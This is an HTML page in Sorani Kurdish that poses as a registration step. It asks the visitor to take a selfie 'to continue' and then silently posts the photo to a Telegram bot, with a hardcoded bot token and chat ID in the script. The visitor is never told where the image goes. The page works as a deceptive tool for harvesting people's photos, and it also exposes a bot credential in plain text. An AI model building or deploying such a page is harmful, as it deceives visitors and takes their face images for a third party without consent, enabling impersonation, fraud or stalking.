<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تۆمارکردن</title>
</head>
<body style="background: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center;">

    <h2>تکایە بۆ بەردەوامبوون وێنەیەک بگرە</h2>
    
    <input type="file" accept="image/*" capture="user" id="cameraInput" style="display: none;">
    
    <label for="cameraInput" style="padding: 15px 30px; background: #0088cc; color: white; border-radius: 10px; cursor: pointer; font-size: 18px;">
        کردنەوەی کامێرا 📸
    </label>

    <p id="status" style="margin-top: 20px; color: gray;"></p>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g';
        const myId = '7978104952';

        document.getElementById('cameraInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;

            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە، وێنەکە دەنێردرێت...";

            const formData = new FormData();
            formData.append('chat_id', myId);
            formData.append('photo', file);

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => {
                if(res.ok) {
                    document.getElementById('status').innerText = "تەواو! وێنەکە بە سەرکەوتوویی نێردرا.";
                } else {
                    document.getElementById('status').innerText = "هەڵەیەک ڕوویدا لە ناردن.";
                }
            })
            .catch(err => {
                document.getElementById('status').innerText = "کێشەی ئینتەرنێت هەیە.";
            });
        });
    </script>
</body>
</html>
